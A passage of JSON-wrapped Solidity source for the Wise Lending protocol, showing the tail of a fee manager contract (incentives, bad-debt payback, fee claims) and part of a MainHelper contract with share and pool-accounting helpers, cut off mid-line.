NoIncentive();\n        }\n\n        delete gatheredIncentiveToken[msg.sender][_feeToken];\n\n        emit ClaimedIncentives(\n            msg.sender,\n            _feeToken,\n            amount,\n            block.timestamp\n        );\n\n        _safeTransfer(\n            _feeToken,\n            msg.sender,\n            amount\n        );\n    }\n\n    /**\n     * @dev Function changing incentiveOwnerA! Only callable by\n     * incentiveOwnerA.\n     */\n    function changeIncentiveUSDA(\n        address _newOwner\n    )\n        external\n    {\n        if (msg.sender != incentiveOwnerA) {\n            revert NotAllowed();\n        }\n\n        if (_newOwner == incentiveOwnerA) {\n            revert NotAllowed();\n        }\n\n        if (_newOwner == incentiveOwnerB) {\n            revert NotAllowed();\n        }\n\n        incentiveUSD[_newOwner] = incentiveUSD[\n            incentiveOwnerA\n        ];\n\n        delete incentiveUSD[\n            incentiveOwnerA\n        ];\n\n        incentiveOwnerA = _newOwner;\n\n        emit IncentiveOwnerAChanged(\n            _newOwner,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Function changing incentiveOwnerB! Only callable by\n     * incentiveOwnerB.\n     */\n    function changeIncentiveUSDB(\n        address _newOwner\n    )\n        external\n    {\n        if (msg.sender != incentiveOwnerB) {\n            revert NotAllowed();\n        }\n\n        if (_newOwner == incentiveOwnerA) {\n            revert NotAllowed();\n        }\n\n        if (_newOwner == incentiveOwnerB) {\n            revert NotAllowed();\n        }\n\n        incentiveUSD[_newOwner] = incentiveUSD[\n            incentiveOwnerB\n        ];\n\n        delete incentiveUSD[\n            incentiveOwnerB\n        ];\n\n        incentiveOwnerB = _newOwner;\n\n        emit IncentiveOwnerBChanged(\n            _newOwner,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Function adding new pool token to pool token list.\n     * Called during pool creation and only callable by wiseLending\n     * contract.\n     */\n    function addPoolTokenAddress(\n        address _poolToken\n    )\n        external\n        onlyWiseLending\n    {\n        poolTokenAddresses.push(\n            _poolToken\n        );\n\n        poolTokenAdded[_poolToken] = true;\n\n        emit PoolTokenAdded(\n            _poolToken,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Function to add pool token manualy. Only\n     * callable by feeManager master.\n     */\n    function addPoolTokenAddressManual(\n        address _poolToken\n    )\n        external\n        onlyMaster\n    {\n        if (poolTokenAdded[_poolToken] == true) {\n            revert PoolAlreadyAdded();\n        }\n\n        poolTokenAddresses.push(\n            _poolToken\n        );\n\n        poolTokenAdded[_poolToken] = true;\n\n        emit PoolTokenAdded(\n            _poolToken,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Function to remove pool token manualy from pool\n     * token list. Only callable by feeManager master.\n     */\n    function removePoolTokenManual(\n        address _poolToken\n    )\n        external\n        onlyMaster\n    {\n        uint256 i;\n        uint256 len = getPoolTokenAddressesLength();\n        uint256 lastEntry = len - 1;\n        bool found;\n\n        if (poolTokenAdded[_poolToken] == false) {\n            revert PoolNotPresent();\n        }\n\n        while (i < len) {\n\n            if (_poolToken != poolTokenAddresses[i]) {\n\n                unchecked {\n                    ++i;\n                }\n\n                continue;\n            }\n\n            found = true;\n\n            if (i != lastEntry) {\n                poolTokenAddresses[i] = poolTokenAddresses[lastEntry];\n            }\n\n            break;\n        }\n\n        if (found == true) {\n\n            poolTokenAddresses.pop();\n            poolTokenAdded[_poolToken] = false;\n\n            emit PoolTokenRemoved(\n                _poolToken,\n                block.timestamp\n            );\n\n            return;\n        }\n\n        revert PoolNotPresent();\n    }\n\n    /**\n     * @dev Increase function for total bad debt of\n     * wiseLending. Only callable by wiseSecurity contract\n     * during liquidation.\n     */\n    function increaseTotalBadDebtLiquidation(\n        uint256 _amount\n    )\n        external\n        onlyWiseSecurity\n    {\n        _increaseTotalBadDebt(\n            _amount\n        );\n\n        emit BadDebtIncreasedLiquidation(\n            _amount,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Increase function for bad debt of a position.\n     * Only callable by wiseSecurity contract during liquidation.\n     */\n    function setBadDebtUserLiquidation(\n        uint256 _nftId,\n        uint256 _amount\n    )\n        external\n        onlyWiseSecurity\n    {\n        _setBadDebtPosition(\n            _nftId,\n            _amount\n        );\n\n        emit SetBadDebtPosition(\n            _nftId,\n            _amount,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Set function to declare an address as beneficial for\n     * a fee token. Address can claim gathered fee token as long as\n     * it is declared as beneficial. Only setable by master.\n     */\n    function setBeneficial(\n        address _user,\n        address[] calldata _feeTokens\n    )\n        external\n        onlyMaster\n    {\n        uint256 i;\n        uint256 l = _feeTokens.length;\n\n        while (i < l) {\n            _setAllowedTokens(\n                _user,\n                _feeTokens[i],\n                true\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        emit SetBeneficial(\n            _user,\n            _feeTokens,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Set function to remove an address as beneficial for\n     * a fee token. Only setable by master.\n     */\n    function revokeBeneficial(\n        address _user,\n        address[] memory _feeTokens\n    )\n        external\n        onlyMaster\n    {\n        uint256 i;\n        uint256 l = _feeTokens.length;\n\n        while (i < l) {\n            _setAllowedTokens(\n                _user,\n                _feeTokens[i],\n                false\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        emit RevokeBeneficial(\n            _user,\n            _feeTokens,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Claim all fees from wiseLending and send them to feeManager.\n     */\n    function claimWiseFeesBulk()\n        external\n    {\n        uint256 i;\n        uint256 l = getPoolTokenAddressesLength();\n\n        while (i < l) {\n            claimWiseFees(\n                poolTokenAddresses[i]\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        emit ClaimedFeesWiseBulk(\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Claim fees from wiseLending and send them to feeManager for\n     * a specific pool.\n     */\n    function claimWiseFees(\n        address _poolToken\n    )\n        public\n    {\n        address underlyingTokenAddress = _poolToken;\n\n        uint256 shares = WISE_LENDING.getPositionLendingShares(\n            FEE_MANAGER_NFT,\n            _poolToken\n        );\n\n        if (shares == 0) {\n            return;\n        }\n\n        uint256 tokenAmount = WISE_LENDING.withdrawExactShares(\n            FEE_MANAGER_NFT,\n            _poolToken,\n            shares\n        );\n\n        if (isAaveToken[_poolToken] == true) {\n\n            underlyingTokenAddress = underlyingToken[\n                _poolToken\n            ];\n\n            tokenAmount = AAVE.withdraw(\n                underlyingTokenAddress,\n                tokenAmount,\n                address(this)\n            );\n        }\n\n        if (totalBadDebtETH == 0) {\n\n            tokenAmount = _distributeIncentives(\n                tokenAmount,\n                _poolToken,\n                underlyingTokenAddress\n            );\n        }\n\n        _increaseFeeTokens(\n            underlyingTokenAddress,\n            tokenAmount\n        );\n\n        emit ClaimedFeesWise(\n            underlyingTokenAddress,\n            tokenAmount,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Function for beneficial to claim gathered fees. Can only\n     * claim fees for which the beneficial is allowed. Can only claim\n     * token which are inside the feeManager.\n     */\n    function claimFeesBeneficial(\n        address _feeToken,\n        uint256 _amount\n    )\n        external\n    {\n        address caller = msg.sender;\n\n        if (totalBadDebtETH > 0) {\n            revert ExistingBadDebt();\n        }\n\n        if (allowedTokens[caller][_feeToken] == false) {\n            revert NotAllowed();\n        }\n\n        _decreaseFeeTokens(\n            _feeToken,\n            _amount\n        );\n\n        _safeTransfer(\n            _feeToken,\n            caller,\n            _amount\n        );\n\n        emit ClaimedFeesBeneficial(\n            caller,\n            _feeToken,\n            _amount,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Function for paying back bad debt of a position. Caller\n     * chooses postion, token and receive token. Only gathered fee token\n     * can be distributed as receive token. Caller gets 5% more\n     * in ETH value as incentive.\n     */\n    function paybackBadDebtForToken(\n        uint256 _nftId,\n        address _paybackToken,\n        address _receivingToken,\n        uint256 _shares\n    )\n        external\n        returns (\n            uint256 paybackAmount,\n            uint256 receivingAmount\n        )\n    {\n        updatePositionCurrentBadDebt(\n            _nftId\n        );\n\n        if (badDebtPosition[_nftId] == 0) {\n            return (\n                0,\n                0\n            );\n        }\n\n        if (WISE_LENDING.getTotalDepositShares(_receivingToken) == 0) {\n            revert PoolNotActive();\n        }\n\n        if (WISE_LENDING.getTotalDepositShares(_paybackToken) == 0) {\n            revert PoolNotActive();\n        }\n\n        paybackAmount = WISE_LENDING.paybackAmount(\n            _paybackToken,\n            _shares\n        );\n\n        WISE_LENDING.corePaybackFeeManager(\n            _paybackToken,\n            _nftId,\n            paybackAmount,\n            _shares\n        );\n\n        _updateUserBadDebt(\n            _nftId\n        );\n\n        receivingAmount = getReceivingToken(\n            _paybackToken,\n            _receivingToken,\n            paybackAmount\n        );\n\n        _decreaseFeeTokens(\n            _receivingToken,\n            receivingAmount\n        );\n\n        _safeTransferFrom(\n            _paybackToken,\n            msg.sender,\n            address(WISE_LENDING),\n            paybackAmount\n        );\n\n        _safeTransfer(\n            _receivingToken,\n            msg.sender,\n            receivingAmount\n        );\n\n        emit PayedBackBadDebt(\n            _nftId,\n            msg.sender,\n            _paybackToken,\n            _receivingToken,\n            paybackAmount,\n            block.timestamp\n        );\n    }\n\n    /**\n     * @dev Function for paying back bad debt of a position. Caller\n     * chooses postion, token and receive token. Caller gets no\n     * receive token!\n     */\n    function paybackBadDebtNoReward(\n        uint256 _nftId,\n        address _paybackToken,\n        uint256 _shares\n    )\n        external\n        returns (uint256 paybackAmount)\n    {\n        updatePositionCurrentBadDebt(\n            _nftId\n        );\n\n        if (badDebtPosition[_nftId] == 0) {\n            return 0;\n        }\n\n        if (WISE_LENDING.getTotalDepositShares(_paybackToken) == 0) {\n            revert PoolNotActive();\n        }\n\n        paybackAmount = WISE_LENDING.paybackAmount(\n            _paybackToken,\n            _shares\n        );\n\n        WISE_LENDING.corePaybackFeeManager(\n            _paybackToken,\n            _nftId,\n            paybackAmount,\n            _shares\n        );\n\n        _updateUserBadDebt(\n            _nftId\n        );\n\n        emit PayedBackBadDebtFree(\n            _nftId,\n            msg.sender,\n            _paybackToken,\n            paybackAmount,\n            block.timestamp\n        );\n\n        _safeTransferFrom(\n            _paybackToken,\n            msg.sender,\n            address(WISE_LENDING),\n            paybackAmount\n        );\n    }\n\n    /**\n     * @dev Returning the number of pool token\n     * addresses saved inside the feeManager.\n     */\n    function getPoolTokenAddressesLength()\n        public\n        view\n        returns (uint256)\n    {\n        return poolTokenAddresses.length;\n    }\n\n    /**\n     * @dev Returns the pool token address\n     * at the _index postion of the array.\n     */\n    function getPoolTokenAdressesByIndex(\n        uint256 _index\n    )\n        external\n        view\n        returns (address)\n    {\n        return poolTokenAddresses[_index];\n    }\n\n    /**\n     * @dev Bulk function for updating pools - loops through\n     * all pools saved inside the poolTokenAddresses array.\n     */\n    function syncAllPools()\n        external\n    {\n        uint256 i;\n        uint256 l = poolTokenAddresses.length;\n\n        while (i < l) {\n            WISE_LENDING.syncManually(\n                poolTokenAddresses[i]\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n}"
    },
    {
      "filename": "contracts/MainHelper.sol",
      "content": "// SPDX-License-Identifier: -- WISE --\n\npragma solidity =0.8.24;\n\nimport \"./WiseLowLevelHelper.sol\";\n\nabstract contract MainHelper is WiseLowLevelHelper {\n\n    /**\n     * @dev Helper function to convert {_amount}\n     * of a certain pool with {_poolToken}\n     * into lending shares. Includes devison\n     * by zero and share security checks.\n     * Needs latest pseudo amount for accurate\n     * result.\n     */\n    function calculateLendingShares(\n        address _poolToken,\n        uint256 _amount,\n        bool _maxSharePrice\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return _calculateShares(\n            lendingPoolData[_poolToken].totalDepositShares * _amount,\n            lendingPoolData[_poolToken].pseudoTotalPool,\n            _maxSharePrice\n        );\n    }\n\n    function _calculateShares(\n        uint256 _product,\n        uint256 _pseudo,\n        bool _maxSharePrice\n    )\n        private\n        pure\n        returns (uint256)\n    {\n        return _maxSharePrice == true\n            ? _product / _pseudo + 1\n            : _product / _pseudo - 1;\n    }\n\n    /**\n     * @dev Helper function to convert {_amount}\n     * of a certain pool with {_poolToken}\n     * into borrow shares. Includes devison\n     * by zero and share security checks.\n     * Needs latest pseudo amount for accurate\n     * result.\n     */\n    function calculateBorrowShares(\n        address _poolToken,\n        uint256 _amount,\n        bool _maxSharePrice\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return _calculateShares(\n            borrowPoolData[_poolToken].totalBorrowShares * _amount,\n            borrowPoolData[_poolToken].pseudoTotalBorrowAmount,\n            _maxSharePrice\n        );\n    }\n\n    /**\n     * @dev Helper function to convert {_shares}\n     * of a certain pool with {_poolToken}\n     * into lending token. Includes devison\n     * by zero and share security checks.\n     * Needs latest pseudo amount for accurate\n     * result.\n     */\n    function cashoutAmount(\n        address _poolToken,\n        uint256 _shares\n    )\n        external\n        view\n        returns (uint256)\n    {\n        return _cashoutAmount(\n            _poolToken,\n            _shares\n        );\n    }\n\n    function _cashoutAmount(\n        address _poolToken,\n        uint256 _shares\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        return _shares\n            * lendingPoolData[_poolToken].pseudoTotalPool\n            / lendingPoolData[_poolToken].totalDepositShares - 1;\n    }\n\n    /**\n     * @dev Helper function to convert {_shares}\n     * of a certain pool with {_poolToken}\n     * into borrow token. Includes devison\n     * by zero and share security checks.\n     * Needs latest pseudo amount for accurate\n     * result.\n     */\n    function paybackAmount(\n        address _poolToken,\n        uint256 _shares\n    )\n        public\n        view\n        returns (uint256)\n    {\n        uint256 product = _shares\n            * borrowPoolData[_poolToken].pseudoTotalBorrowAmount;\n\n        uint256 totalBorrowShares = borrowPoolData[_poolToken].totalBorrowShares;\n\n        return product / totalBorrowShares + 1;\n    }\n\n    /**\n     * @dev Internal helper combining one\n     * security check with lending share\n     * calculation for withdraw.\n     */\n    function _preparationsWithdraw(\n        uint256 _nftId,\n        address _caller,\n        address _poolToken,\n        uint256 _amount\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        _checkOwnerPosition(\n            _nftId,\n            _caller\n        );\n\n        return calculateLendingShares(\n            {\n                _poolToken: _poolToken,\n                _amount: _amount,\n                _maxSharePrice: true\n            }\n        );\n    }\n\n    /**\n     * @dev Internal helper calculating {_poolToken}\n     * utilization. Includes math underflow check.\n     */\n    function _getValueUtilization(\n        address _poolToken\n    )\n        private\n        view\n        returns (uint256)\n    {\n        uint256 totalPool = globalPoolData[_poolToken].totalPool;\n        uint256 pseudoPool = lendingPoolData[_poolToken].pseudoTotalPool;\n\n        if (totalPool >= pseudoPool) {\n            return 0;\n        }\n\n        return PRECISION_FACTOR_E18 - (PRECISION_FACTOR_E18\n            * totalPool\n            / pseudoPool\n        );\n    }\n\n    /**\n     * @dev Internal helper function setting new pool\n     * utilization by calling {_getValueUtilization}.\n     */\n    function _updateUtilization(\n        address _poolToken\n    )\n        private\n    {\n        globalPoolData[_poolToken].utilization = _getValueUtilization(\n            _poolToken\n        );\n    }\n\n    /**\n     * @dev Internal helper function checking if\n     * cleanup gathered new token to save into\n     * pool variables.\n     */\n    function _checkCleanUp(\n        uint256 _amountContract,\n        uint256 _totalPool,\n        uint256 _bareAmount\n    )\n        private\n        pure\n        returns (bool)\n    {\n        return _bareAmount + _totalPool >= _amountContract;\n    }\n\n    /**\n     * @dev Wrapper for isolation pool check.\n     */\n    function _onlyIsolationPool(\n        address _poolAddress\n    )\n        internal\n        view\n    {\n        if (verifiedIsolationPool[_poolAddress] == false) {\n            revert InvalidAction();\n        }\n    }\n\n    /**\n     * @dev Internal helper function checking if\n     * user inputs are safe.\n     */\n    function _validateIsolationPoolLiquidation(\n        address _caller,\n        uint256 _nftId,\n        uint256 _nftIdLiquidator\n    )\n        internal\n        view\n    {\n        _onlyIsolationPool(\n            _caller\n        );\n\n        if (positionLocked[_nftId] == false) {\n            revert NotPowerFarm();\n        }\n\n        _checkLiquidatorNft(\n            _nftId,\n            _nftIdLiquidator\n        );\n\n        if (POSITION_NFT.ownerOf(_nftId) != _caller) {\n            revert InvalidCaller();\n        }\n    }\n\n    function _checkLiquidatorNft(\n        uint256 _nftId,\n        uint256 _nftIdLiquidator\n    )\n        internal\n        view\n    {\n        if (positionLocked[_nftIdLiquidator] == true) {\n            revert LiquidatorIsInPowerFarm();\n        }\n\n        if (_nftIdLiquidator == _nftId) {\n            revert InvalidLiquidator();\n        }\n\n        if (_nftIdLiquidator >= POSITION_NFT.getNextExpectedId()) {\n            revert InvalidLiquidator();\n        }\n    }\n\n    function _getBalance(\n        address _tokenAddress\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        return IERC20(_tokenAddress).balanceOf(\n            address(this)\n        );\n    }\n\n    /**\n     * @dev Internal helper function checking if falsely\n     * sent token are inside the contract for the pool with\n     * {_poolToken}. If this is the case it adds those token\n     * to the pool by increasing pseudo and total amount.\n     * In context of aToken from aave pools it gathers the\n     * rebase amount from supply APY of aave pools.\n     */\n    function _cleanUp(\n        address _poolToken\n    )\n        internal\n    {\n        _validateNonZero(\n            lendingPoolData[_poolToken].totalDepositShares\n        );\n\n        uint256 amountContract = _getBalance(\n            _poolToken\n        );\n\n        uint256 totalPool = globalPoolData[_poolToken].totalPool;\n        uint256 bareToken = globalPoolData[_poolToken].totalBareToken;\n\n        if (_checkCleanUp(amountContract, totalPool, bareToken)) {\n            return;\n        }\n\n        unchecked {\n\n            uint256 difference = amountContract - (\n                totalPool + bareToken\n            );\n\n            uint256 allowedDifference = _getAllowedDifference(\n                _poolToken\n            );\n\n            if (difference > allowedDifference) {\n\n                _increaseTotalAndPseudoTotalPool(\n                    _poolToken,\n                    allowedDifference\n                );\n\n                return;\n            }\n\n            _increaseTotalAndPseudoTotalPool(\n                _poolToken,\n                difference\n            );\n        }\n    }\n\n    /**\n     * @dev Internal helper function calculating\n     * allowed increase of pseudoTotalPool to\n     * contain shareprice increase reasoanbly.\n    */\n    function _getAllowedDifference(\n        address _poolToken\n    )\n        private\n        view\n        returns (uint256)\n    {\n        uint256 timeDifference = block.timestamp\n            - timestampsPoolData[_poolToken].timeStamp;\n\n        return timeDifference\n            * lendingPoolData[_poolToken].pseudoTotalPool\n            * PRECISION_FACTOR_E18\n            / PRECISION_FACTOR_YEAR;\n    }\n\n    /**\n     * @dev Internal helper function for\n     * updating pools and calling {_cleanUp}.\n     * Also includes re-entrancy guard for\n     * curve pools security checks.\n     */\n    function _preparePool(\n        address _poolToken\n    )\n        internal\n    {\n        _cleanUp(\n            _poolToken\n        );\n\n        _updatePseudoTotalAmounts(\n            _poolToken\n        );\n    }\n\n    /**\n     * @dev Internal helper function for\n     * updating all lending tokens of a\n     * position.\n     */\n    function _preparationTokens(\n        mapping(uint256 => address[]) storage _userTokenData,\n        uint256 _nftId,\n        address _poolToken\n    )\n        internal\n        returns (address[] memory)\n    {\n        address[] memory tokens = _userTokenData[\n            _nftId\n        ];\n\n        _prepareTokens(\n            _poolToken,\n            tokens\n        );\n\n        return tokens;\n    }\n\n    /**\n     * @dev Internal helper function for\n     * updating pseudo amounts of a pool\n     * inside {tokens} array and sets new\n     * borrow rates.\n     */\n    function _prepareTokens(\n        address _poolToken,\n        address[] memory _tokens\n    )\n        private\n    {\n        address currentAddress;\n\n        uint256 i;\n        uint256 l = _tokens.length;\n\n        while (i < l) {\n\n            currentAddress = _tokens[i];\n\n            unchecked {\n                ++i;\n            }\n\n            if (currentAddress == _poolToken) {\n                continue;\n            }\n\n            _preparePool(\n                currentAddress\n            );\n\n            _newBorrowRate(\n                currentAddress\n            );\n        }\n    }\n\n    /**\n     * @dev Internal helper function for iterating\n     * over all tokens which may contain curvePools.\n     */\n    function _curveSecurityChecks(\n        address[] memory _lendTokens,\n        address[] memory _borrowTokens\n    )\n        internal\n    {\n        _whileLoopCurveSecurity(\n            _lendTokens\n        );\n\n        _whileLoopCurveSecurity(\n            _borrowTokens\n        );\n    }\n\n    /**\n     * @dev Internal helper function for executing while loops\n     * iterating over all tokens which may contain curvePools.\n     */\n    function _whileLoopCurveSecurity(\n        address[] memory _tokens\n    )\n        private\n    {\n        uint256 i;\n        uint256 l = _tokens.length;\n\n        while (i < l) {\n\n            WISE_SECURITY.curveSecurityCheck(\n                _tokens[i]\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Internal helper function\n     * updating pseudo amounts and\n     * printing fee shares for the\n     * feeManager proportional to the\n     * fee percentage of the pool.\n     */\n    function _updatePseudoTotalAmounts(\n        address _poolToken\n    )\n        private\n    {\n        uint256 currentTime = block.timestamp;\n\n        uint256 bareIncrease = borrowPoolData[_poolToken].borrowRate\n            * (currentTime - timestampsPoolData[_poolToken].timeStamp)\n            * borrowPoolData[_poolToken].pseudoTotalBorrowAmount\n            + bufferIncrease[_poolToken];\n\n        if (bareIncrease < PRECISION_FACTOR_YEAR) {\n            bufferIncrease[_poolToken] = bareIncrease;\n\n            _setTimeStamp(\n                _poolToken,\n                currentTime\n            );\n\n            return;\n        }\n\n        delete bufferIncrease[_poolToken];\n\n        uint256 amountInterest = bareIncrease\n            / PRECISION_FACTOR_YEAR;\n\n        uint256 feeAmount = amountInterest\n            * globalPoolData[_poolToken].poolFee\n            / PRECISION_FACTOR_E18;\n\n        _increasePseudoTotalBorrowAmount(\n            _poolToken,\n            amountInterest\n        );\n\n        _increasePseudoTotalPool(\n            _poolToken,\n            amountInterest\n        );\n\n        if (feeAmount == 0) {\n            _setTimeStamp(\n                _poolToken,\n                currentTime\n            );\n            return;\n        }\n\n        uint256 fee"
    }
  ]
}